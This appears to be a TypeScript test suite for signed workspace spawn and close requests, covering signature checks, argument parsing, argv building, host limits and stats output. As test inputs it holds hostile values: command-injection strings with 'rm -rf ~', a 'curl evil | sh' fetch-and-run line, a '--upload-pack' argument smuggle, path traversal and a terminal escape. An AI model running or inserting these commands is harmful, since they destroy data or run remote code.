// T1. A workspace starting and closing workspaces in its own domain: the signed request
// (shared/spawn.ts), the command the host builds from it (shared/actions.ts), the host's
// checks (host/spawn.ts), the events it shows up in (shared/events.ts) and the stats text
// (shared/stats.ts).
import assert from "node:assert/strict";
import * as fs from "node:fs";
import * as os from "node:os";
import * as path from "node:path";
import { describe, it } from "node:test";

// host/spawn.ts keeps its record under DESOLATE_HOME, read when it is first imported.
const home = fs.mkdtempSync(path.join(os.tmpdir(), "desolate-spawn-"));
process.env.DESOLATE_HOME = home;
process.env.DESOLATE_INSTANCE = "t1";

const { canonical, FRESH_MS, parseSigned, sign, verify } = await import("../../../release/shared/spawn.ts");
const { hostArgv, SIGNED_KINDS, signedOf } = await import("../../../release/shared/actions.ts");
const host = await import("../../../release/host/spawn.ts");
const { stateEvents } = await import("../../../release/shared/events.ts");
const { statsLines } = await import("../../../release/shared/stats.ts");
const { workspaceVmName } = await import("../../../release/shared/names.ts");
type Spawn = import("../../../release/shared/spawn.ts").Spawn;

const KEY = "ab".repeat(32);
const at = "2026-11-16T00:00:00.000Z";
const now = Date.parse(at) + 1000;
const spawnRequest = (over: Partial<Spawn> = {}): Spawn => ({ op: "spawn", domain: "acme", parent: "w1", name: "helper", branch: "issue/9", command: ["claude", "-p", "fix it; $(rm -rf ~) `id` --help"], at, nonce: "0f".repeat(16), ...over });
/** The request as the root carries it to the host: an action's string arguments. */
const asArgs = (r: Spawn, mac: string): Record<string, string> => ({ domain: r.domain, workspace: r.name, parent: r.parent, branch: r.branch, command: JSON.stringify(r.command), at: r.at, nonce: r.nonce, mac });

describe("T1 a workspace's signed request", () => {
  it("is good only with the parent's key, for exactly what was signed, while fresh", () => {
    const r = spawnRequest();
    const mac = sign(KEY, r);
    assert.equal(verify(KEY, { ...r, mac }, now), null);
    // Control above; each change below is one the root's ordinary user could make in transit.
    assert.match(String(verify(KEY, { ...r, domain: "beta", mac }, now)), /not signed by beta\/w1/, "another domain");
    assert.match(String(verify(KEY, { ...r, command: ["bash", "-c", "curl evil | sh"], mac }, now)), /not signed/, "another command");
    assert.match(String(verify(KEY, { ...r, name: "other", mac }, now)), /not signed/, "another name");
    assert.match(String(verify("cd".repeat(32), { ...r, mac }, now)), /not signed/, "another workspace's key");
    assert.match(String(verify(KEY, { ...r, mac }, now + FRESH_MS + 1)), /too old/);
    assert.match(String(verify(null, { ...r, mac }, now)), /no key/);
    // A close's signature is not a spawn's.
    const close = { op: "close" as const, domain: "acme", parent: "w1", name: "helper", at, nonce: r.nonce };
    assert.notEqual(canonical(close), canonical(r));
  });
  it("is read field by field before anything trusts it", () => {
    const r = spawnRequest();
    const good = { ...r, mac: sign(KEY, r) };
    assert.equal(parseSigned(good)?.op, "spawn");
    for (const bad of [{ name: "w1" }, { name: "-x" }, { domain: "../x" }, { parent: "W1" }, { branch: "--upload-pack=x" }, { command: "rm -rf ~" }, { command: ["a\u0000b"] }, { command: Array(65).fill("x") }, { op: "exec" }, { mac: "zz" }, { at: "yesterday" }])
      assert.equal(parseSigned({ ...good, ...bad }), null, JSON.stringify(bad));
  });
});

describe("T1 the command the host builds from it", () => {
  it("is `desolate up` with the words after `--`, each one argv, never a shell line", () => {
    const r = spawnRequest();
    const argv = hostArgv("workspace.spawn", asArgs(r, sign(KEY, r)));
    assert.deepEqual(argv, ["up", "acme", "--name", "helper", "--started-by", "w1", "--branch", "issue/9", "--", "claude", "-p", "fix it; $(rm -rf ~) `id` --help"]);
    assert.deepEqual(hostArgv("workspace.close", { domain: "acme", workspace: "helper", parent: "w1", at, nonce: r.nonce, mac: "ab".repeat(32) }), ["rm", "acme/helper", "--if-clean"]);
  });
  it("is nothing for a request that is not one", () => {
    const r = spawnRequest();
    const args = asArgs(r, sign(KEY, r));
    for (const bad of [{ command: "not json" }, { command: '"a string"' }, { workspace: "--all" }, { parent: "w1;x" }, { branch: "-b" }, { mac: "" }])
      assert.equal(hostArgv("workspace.spawn", { ...args, ...bad }), null, JSON.stringify(bad));
    assert.ok(SIGNED_KINDS.has("workspace.spawn") && SIGNED_KINDS.has("workspace.close"));
  });
});

describe("T1 the host's checks before it runs one", () => {
  const vm = workspaceVmName("t1", "acme", "w1");
  fs.mkdirSync(path.join(home, "state", "workspace-keys"), { recursive: true });
  fs.writeFileSync(path.join(home, "state", "workspace-keys", vm), `${KEY}\n`);
  const exists = (name: string) => name === vm || name === workspaceVmName("t1", "acme", "helper");
  it("refuses a domain with no limit, then runs it once its limit allows, and only once", () => {
    const r = spawnRequest({ nonce: "01".repeat(16) });
    const signed = signedOf("spawn", asArgs(r, sign(KEY, r)))!;
    assert.match(String(host.check(signed, exists, now)), /does not let its workspaces start workspaces/);
    host.setMax("acme", 1);
    assert.equal(host.check(signed, exists, now), null, "the control: allowed");
    assert.match(String(host.check(signed, exists, now)), /already run/, "a replay");
    host.recordStarted("acme", "helper", "w1");
    const next = spawnRequest({ name: "second", nonce: "02".repeat(16) });
    assert.match(String(host.check(signedOf("spawn", asArgs(next, sign(KEY, next)))!, exists, now)), /its limit/);
  });
  it("closes only what the asking workspace started", () => {
    const close = { op: "close" as const, domain: "acme", parent: "w1", name: "helper", at, nonce: "03".repeat(16) };
    assert.equal(host.check({ ...close, mac: sign(KEY, close) }, exists, now), null);
    const other = { ...close, name: "w9", nonce: "04".repeat(16) };
    assert.match(String(host.check({ ...other, mac: sign(KEY, other) }, exists, now)), /a person started it/);
  });
  it("refuses a request the root signed itself, with no key of the parent's", () => {
    const r = spawnRequest({ parent: "w2", nonce: "05".repeat(16) });
    assert.match(String(host.check({ ...r, mac: sign("ee".repeat(32), r) }, exists, now)), /no key for acme\/w2/);
  });
});

describe("T1 workspaces in the domain's events and stats", () => {
  it("made, stopped and removed, with who started each", () => {
    const state = (workspaces: { workspace: string; state: string; startedBy: string | null }[]) => ({ domains: [{ slug: "acme", workspaces: workspaces.map((w) => ({ ...w, checkouts: [] })) }] });
    const a = state([{ workspace: "w1", state: "up", startedBy: null }]);
    const b = state([{ workspace: "w1", state: "up", startedBy: null }, { workspace: "helper", state: "up", startedBy: "w1" }]);
    const c = state([{ workspace: "w1", state: "stopped", startedBy: null }]);
    const pick = (events: Record<string, unknown>[]) => events.map(({ type, workspace, startedBy, state: s }) => ({ type, workspace, startedBy, state: s }));
    assert.deepEqual(pick(stateEvents(a, b)), [{ type: "workspace-made", workspace: "helper", startedBy: "w1", state: "up" }]);
    assert.deepEqual(pick(stateEvents(b, c)), [{ type: "workspace-state", workspace: "w1", startedBy: null, state: "stopped" }, { type: "workspace-removed", workspace: "helper", startedBy: "w1", state: undefined }]);
  });
  it("stats say who started each, and an agent's status is printable text", () => {
    const lines = statsLines({ v: 1, domain: "acme", title: "Acme", repos: ["acme/app"], spawn: { max: 2, used: 1 }, mac: { cpus: 10, memoryMiB: 32768 }, running: { workspaces: 2, memoryMiB: 8192 },
      workspaces: [{ workspace: "helper", state: "up", vm: "running", startedBy: "w1", outlived: true, size: { cpus: 2, memoryMiB: 4096, diskGiB: 40 }, checkouts: [{ repo: "acme/app", branch: "issue/9", head: "issue/9" }], status: { color: "yellow", message: "half done\u001b]0;x\u0007" } }] });
    assert.ok(lines.includes("  this Mac: 10 CPUs, 32 GiB; running here: 2 workspace(s), 8 GiB given to them"));
    assert.ok(lines.includes("  started by workspaces: 1 of at most 2 (desolate spawn; each counts until removed)"));
    assert.ok(lines.includes("  helper  running  2 CPU, 4 GiB  started by w1 (since removed: this one outlived it)"));
    assert.ok(lines.includes("      status yellow: half done?]0;x?"));
  });
});
